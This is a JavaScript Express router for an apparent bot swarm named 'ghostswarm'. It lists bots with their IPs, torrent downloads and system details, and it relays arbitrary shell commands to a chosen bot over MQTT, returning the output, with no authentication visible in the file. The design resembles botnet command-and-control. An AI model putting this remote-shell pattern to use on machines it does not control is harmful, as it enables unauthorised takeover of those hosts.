const express = require("express");
const router = express.Router();
const { getBots } = require('../utils/utils'); // Import utility function to get bots

// Get dependencies from parent context
let redis, mqttClient;

// Initialize function to set dependencies
function initBotRoutes(redisClient, mqttClientInstance) {
   redis = redisClient;
   mqttClient = mqttClientInstance;
}

router.get('/', async (req, res) => {
   try {
      if (!redis) {
         return res.status(500).json({ error: 'Server not properly initialized' });
      }

      // Get all bot status keys
      const keys = await redis.keys('status:*');
      const bots = [];

      for (const key of keys) {
         try {
            const statusData = await redis.get(key);
            if (statusData) {
               const status = JSON.parse(statusData);
               const botId = key.replace('status:', '');

               // Calculate if bot is alive (last seen within 2 minutes)
               const lastSeen = status.lastSeen || status.time || 0;
               const isAlive = (Date.now() - lastSeen) < 120000; // 2 minutes

               bots.push({
                  id: botId,
                  ip: status.ip || 'unknown',
                  alive: isAlive,
                  lastSeen: lastSeen ? new Date(lastSeen).toLocaleString() : 'unknown',
                  status: status.status || 'unknown',
                  // Include all download information
                  downloads: status.downloads || {},
                  // Add summary stats
                  stats: {
                     totalDownloads: Object.keys(status.downloads || {}).length,
                     activeDownloads: Object.values(status.downloads || {}).filter(d => d.status === 'downloading' || d.status === 'stalled').length,
                     completedDownloads: Object.values(status.downloads || {}).filter(d => d.status === 'completed').length,
                     totalPieces: Object.values(status.downloads || {}).reduce((sum, d) => sum + (d.total || 0), 0),
                     downloadedPieces: Object.values(status.downloads || {}).reduce((sum, d) => sum + (d.completed || 0), 0),
                     // Use bot's own stats if available, fallback to calculations
                     totalTorrents: status.stats?.totalTorrents || 0,
                     totalFiles: status.stats?.totalFiles || 0,
                     uptime: status.stats?.uptime || 0
                  },
                  // Additional metadata
                  metadata: {
                     uptime: status.stats?.uptime || status.uptime || 0,
                     version: status.version || 'unknown',
                     platform: status.system?.platform || status.platform || 'unknown',
                     memory: status.system?.memory || null,
                     arch: status.system?.arch || 'unknown'
                  }
               });
            }
         } catch (parseError) {
            console.warn(`⚠️ Failed to parse status for ${key}:`, parseError.message);
            const botId = key.replace('status:', '');
            bots.push({
               id: botId,
               ip: 'unknown',
               alive: false,
               lastSeen: 'parse error',
               status: 'error',
               downloads: {},
               stats: {
                  totalDownloads: 0,
                  activeDownloads: 0,
                  completedDownloads: 0,
                  totalPieces: 0,
                  downloadedPieces: 0
               },
               metadata: {
                  uptime: 0,
                  version: 'unknown',
                  platform: 'unknown'
               }
            });
         }
      }

      // Sort by alive status, then by ID
      bots.sort((a, b) => {
         if (a.alive !== b.alive) return b.alive - a.alive;
         return a.id.localeCompare(b.id);
      });

      res.json(bots);
   } catch (error) {
      console.error('❌ Error fetching bots:', error);
      res.status(500).json({ error: 'Failed to fetch bots' });
   }
});

router.post('/:botId/command', async (req, res) => {
   try {
      if (!redis || !mqttClient) {
         return res.status(500).json({ error: 'Server not properly initialized' });
      }

      const { botId } = req.params;
      const data = req.body;
      const command = data.command;
      const type = data.type || 'shell';

      if (!command) {
         return res.status(400).json({ error: 'Command is required' });
      }

      const requestId = Date.now().toString();
      const topic = `ghostswarm/${botId}/command`;
      const payload = {
         type: type,
         cmd: command,
         requestId
      };

      console.log(`📤 Sending command to ${botId}:`, payload);

      mqttClient.publish(topic, JSON.stringify(payload), { qos: 1 }, async (err) => {
         if (err) {
            console.error(`❌ Failed to send command to ${botId}:`, err);
            return res.status(500).json({ error: 'Failed to send command' });
         }

         // Wait for response
         let attempts = 0;
         const maxAttempts = 30; // 15 seconds timeout

         const checkResponse = async () => {
            const key = `resp:${botId}:${requestId}`;
            const response = await redis.get(key);

            if (response) {
               await redis.del(key); // Clean up
               return res.json({ output: JSON.parse(response) });
            }

            if (attempts++ < maxAttempts) {
               setTimeout(checkResponse, 500);
            } else {
               res.status(408).json({ error: 'Command timeout' });
            }
         };

         checkResponse();
      });
   } catch (error) {
      console.error('❌ Error sending command:', error);
      res.status(500).json({ error: 'Failed to send command' });
   }
});

module.exports = { router, initBotRoutes };